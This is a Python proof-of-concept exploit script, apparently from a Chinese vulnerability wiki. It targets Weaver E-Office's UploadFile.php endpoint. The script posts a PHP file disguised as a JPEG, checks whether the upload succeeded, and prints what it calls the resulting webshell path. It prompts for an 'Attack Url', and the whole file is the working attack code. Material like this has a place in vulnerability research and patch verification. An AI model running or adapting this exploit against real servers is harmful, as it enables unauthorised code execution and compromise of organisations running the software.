#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import base64
import requests
import random
import re
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 泛微-EOffice                                                \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        "Content-Type": "multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4",
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Connection': 'close',
        'Accept-Language': 'zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6',
        'Cookie': 'LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348'
    }
    data = ''' \n
--e64bdf16c554bbc109cecef6451c26a4\nContent-Disposition: form-data; name="Filedata"; filename="test.php"\nContent-Type: image/jpeg
\n<?php phpinfo();?>\n
--e64bdf16c554bbc109cecef6451c26a4-- 
'''
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
       
        response = requests.post(url=vuln_url, data=data,headers=headers, verify=False, timeout=10)
        if "logo" in response.text and response.status_code == 200:
            print(response.text)
            print("\033[36m[o] 存在漏洞 c[o] 上传成功webshell路径:{}images/logo/{} \033[0m".format(target_url,response.text))
    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    POC_1(target_url)